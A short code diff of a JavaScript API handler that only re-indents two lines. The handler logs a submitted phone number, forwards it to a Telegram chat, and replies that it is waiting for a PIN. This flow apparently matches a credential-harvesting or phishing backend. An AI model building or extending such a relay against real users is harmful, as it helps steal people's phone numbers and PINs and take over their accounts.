@@ -24,8 +24,8 @@ export default async function handler(req, res) {
       console.log(`Phone number received: ${phoneNumber}`);
 
       // Send phone number to Telegram
-      const message = `New Phone Number Submission:\nPhone Number: ${phoneNumber}`;
-      await sendTelegramMessage(message);
+const message = `New Phone Number Submission:\nPhone Number: ${phoneNumber}`;
+await sendTelegramMessage(message);
 
       // Respond with success
       res.status(200).json({ status: 'Phone number received. Waiting for PIN.' });
